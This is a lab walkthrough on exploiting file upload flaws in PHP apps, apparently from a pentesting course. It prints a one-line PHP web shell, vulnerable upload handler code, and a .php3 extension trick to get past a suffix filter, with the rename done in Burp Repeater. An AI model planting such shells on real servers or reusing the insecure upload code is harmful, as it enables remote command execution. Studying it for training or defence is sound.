# Essential: File Upload 01

## File Upload Vulnerabilities

* In this section, we will cover how to use file upload functionalities to gain code execution.

* In web applications (especially the ones using the `file systems` to determine what code should be run), you can get code execution on a server, if you manage to upload a file with the right filename (often depending on the extension). In this section, we will see the basics of these types of attacks.

* First, since we are working on a `PHP` application, we will need a `PHP web shell`. A `web shell` is just a simple script or web application that runs the code or commands provided. For example, in `PHP`, the following code is a really simple web shell:

```php
  system($_GET["cmd"]);
```

* More complex web shells can perform advanced operations, such as providing `database` and `file system access`, or even `TCP tunnelling`.

* The first example is a really basic upload form, with no restriction. By using the web shell above, and naming it with a `.php` extension you should be able to get it upload onto the server. Once it's uploaded, you can access the script (with the parameter `cmd=uname` for example) to get command execution.

* You can access this exercise using the following URL: [http://ptl-2c86776c-5993c29b.libcurl.so/](http://ptl-2c86776c-5993c29b.libcurl.so/) .

```php
...

if(isset($_FILES['image']))
{ 
  $dir = '/var/www/upload/';
  $file = basename($_FILES['image']['name']);
  if(move_uploaded_file($_FILES['image']['tmp_name'], $dir. $file))
  {
  echo "Upload done";
  echo "Your file can be found <a href=\"/upload/".htmlentities($file)."\">here</a>";
  }
  else 
  { 
    echo 'Upload failed';
  }
}

...

<form method="POST" action="/" enctype="multipart/form-data">  
Your image: <input type="file" name="image"><br/>
<input type="submit" name="send" value="Send file">
</form> 
...
```

# Essential: File Upload 02

* In this second example, the developer put a restriction on the file name. The file name cannot end with `.php`. To bypass this restriction, you can simply rename the file to `.php3` for example (since the server will load file with this extension as `PHP` file).

* You can access this exercise using the following URL: [http://ptl-ed55b2f8-83325d96.libcurl.so/](http://ptl-ed55b2f8-83325d96.libcurl.so/) .

```php
...

if(isset($_FILES['image']))
{ 
  $dir = '/var/www/upload/';
  $file = basename($_FILES['image']['name']);
  if (preg_match('/\.php$/',$file)) {
    DIE("NO PHP");
  }
  if(move_uploaded_file($_FILES['image']['tmp_name'], $dir. $file))
  {
  echo "Upload done";
  echo "Your file can be found <a href=\"/upload/".htmlentities($file)."\">here</a>";
  }
  else 
  { 
    echo 'Upload failed';
  }
}
...

<form method="POST" action="/" enctype="multipart/form-data">  
Your image: <input type="file" name="image"><br/>
<input type="submit" name="send" value="Send file">
...
```

* you upload `shell.php3` with simple shell `php` code via browser and intercept in `burp` and with the help `burp repeater` you can change the `file name` which saves time.
